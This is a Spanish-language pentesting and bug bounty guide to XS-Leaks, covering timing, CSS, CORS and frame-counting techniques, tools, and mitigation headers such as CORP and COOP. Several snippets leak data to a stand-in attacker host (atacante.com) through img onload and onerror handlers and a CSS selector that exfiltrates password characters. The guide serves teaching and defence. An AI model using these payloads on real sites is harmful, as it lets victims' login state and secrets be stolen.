# XS-Leaks y Side-Channels Web 

## Resumen

XS-Leaks (Cross-Site Leaks) son una familia de ataques de canal lateral que permiten a un atacante extraer información sensible de usuarios autenticados en otros orígenes, explotando diferencias de tiempo, contenidos bloqueados, errores de red y políticas del navegador. Las XS-Leaks no ejecutan directamente código en el contexto de la víctima: obtienen bit a bit datos privados observando efectos colaterales y comportamientos sutiles del navegador (red, CSS, eventos), escapando a medidas tradicionales como SameSite, CORS y CSP.[^1]

---

## Contexto

Las XS-Leaks afectan a cualquier app web donde el atacante pueda inducir al navegador de la víctima a crear requests cross-origin, observar diferencias en la carga de recursos, respuestas HTTP, comportamiento visual (CSS), timings o eventos de error/éxito. Son relevantes en autenticación, compartición de recursos entre subdominios, protección de datos sensibles y control de acceso a APIs modernas (OAuth, GraphQL, REST).

### Principales Vectores y Superficies

- **Red (Timing):** diferencias de tiempo de carga, respuestas 404/200, tamaño de recursos.
- **Comportamiento visual:** diferencias de renderizado CSS, presencia de elementos, estilos aplicados.
- **Eventos JS:** `onload`, `onerror`, manipulación de iframes.
- **API de red:** Fetch/XHR analizando `status`, excepciones CORS.
- **Conductas browser-specific:** manejo de redirecciones, history, navegación privada.

---

## Técnicas Comunes de XS-Leaks

### 1. Redireccionamientos y Diferencias en Respuesta

**Escenario:**
Un endpoint `/profile` responde 302 si no autenticado y 200 si logueado.

**Ataque típico:**
El atacante hace que la víctima cargue:

```html
<img src="https://victima.com/profile" onload="fetch('https://atacante.com/1')" onerror="fetch('https://atacante.com/0')">
```

- Si la imagen se carga correctamente, la víctima está logueada.
- Si genera 302/404, ocurre un fallo y se informa al atacante.

---

### 2. Pixel Perfect (Resource Size/Timing Leak)

Carga elementos (imágenes, scripts, iframes) de rutas privadas, midiendo carga o tamaño.

```javascript
let img = new Image();
img.src = "https://victima.com/secret-image";
img.onload = () => report("exists");
img.onerror = () => report("not-exists");
```

---

### 3. CSS Leak

Aprovecha la capacidad de aplicar estilos sólo si el recurso existe o el usuario accede a cierto estado.

```css
input[type="password"][value^="a"] {
  background-image: url("https://atacante.com/leak?a");
}
```

- CSS obtiene leak visual si la condición se cumple; la petición revela valor.

---

### 4. Frame Counting

Explota la cantidad de redirecciones, frames anidados o history stack para inferir el estado de sesión o pasos interactivos realizados.

---

### 5. Response Timing/CSP Violation

Detecta si una respuesta es bloqueada por CSP observando los fallos de carga de scripts/iframes o midiendo el tiempo entre estado inicial y error.

---

### 6. Fetch/Redirect/CORS Leak

Utiliza fetch/XHR para detectar explícitamente diferencias de red o políticas mediante excepciones:

```javascript
fetch("https://victima.com/private")
  .then(r => r.status)
  .catch(e => report("blocked"));
```

- Si CORS lo permite, puede observar respuesta; si bloqueada, infiere estado.

---

## Ejemplo de Ataque Real

### Exfiltración de estado autenticado (CSRF/SSO Check)

1. Víctima logueada en `victima.com`
2. Atacante hace que visite:

```html
<img src="https://victima.com/api/is_admin" onload="fetch('https://atacante.com/is_admin')" onerror="fetch('https://atacante.com/not_admin')">
```

3. Según el estado, recibe ping en su servidor con bit de autenticación.

### Exfiltración de CSRF Token vía CSS Injection

Si un token se refleja en HTML, el atacante puede usar CSS selectors para extraer carácter a carácter usando múltiples requests y background-images para filtrar el valor.

---

## Automatización y Herramientas

- **XSStrike:** análisis de XSS y XS-Leaks
- **xsinject:** scripts para automating resource timing/cors/behavior
- **XS-Leaks wiki \& cheatsheet**: https://xsleaks.dev/
- **Burp Suite Extensions:** para network timing y automatización OOB

---

## Detección y Pruebas Manuales

- **Carga diferencial de recursos:** pruebas con imágenes, iframes, CSS rules monitorizadas.
- **Inspección de timings:** comparando tiempos entre load/error.
- **Manipulación de CSP y CORS:** observar cómo cambia el acceso a recursos.
- **Historial y navegación:** scripts que manipulan el DOM para contar frames o history length.

---

## Mitigación

**A nivel de app:**

- Verificar respuesta idéntica para recursos privados/públicos (códigos estándar, tamaño de respuesta).
- Implementar cabeceras antibot/anti-canal side:
  - `Cross-Origin-Resource-Policy: same-origin`
  - `Cross-Origin-Opener-Policy`, `Cross-Origin-Embedder-Policy`
  - `X-Frame-Options: DENY` para evitar ataques en frames.
- Enfocar mensajes de error genéricos (no custom para estados internos).
- Restringir Content-Type y prevenir redirecciones basadas en estado.

**A nivel de browser:**

- Uso de políticas recientes (“Fetch Metadata Request Headers”, CORP, COOP)
- Actualizar navegadores y frameworks a versiones que mitigan XS-Leaks conocidas

---

## Ejemplo de Reporte de Bug Bounty

```markdown
## XS-Leak/Side-Channel Exposure via Resource Timing
**Severity:** High
**Summary:** HTTPS://victima.com/profile endpoint leaks session state through differential responses (timing/load).
**PoC:**  
1. Atacante induce a víctima a cargar `/profile` vía `<img>`  
2. Diferente evento (`onload`, `onerror`), según autenticación del usuario
3. El atacante monitoriza solicitudes a su servidor OOB
**Mitigación:**  
- Responder idénticamente en ambos casos, incluir cabeceras CORP y COEP
- Eliminar diferencias de timing y contenido en rutas sensibles
```

---

## Consideraciones para Pentesters \& Bug Bounty

- Prueba endpoints privados con todas las variantes img, script, iframe, fetch, CSS.
- Observa diferencia de estado, tamaño, error CORS, timing y contenido para inferir información.
- Usa herramientas automatizadas para payload chains.
- Prioriza APIs con datos sensibles, endpoints SSO/OAuth, admin panels y recursos protegidos por sesión.

---

Las XS-Leaks son ataques silenciosos y difíciles de detectar pero de alto impacto real, especialmente en arquitecturas SPA y APIs modernas. Integrar pruebas anti-side-channel debe ser parte de toda estrategia defensiva y pipeline de CI/CD.

<div style="text-align: center">⁂</div>

[^1]: https://portswigger.net/web-security/access-control/idor
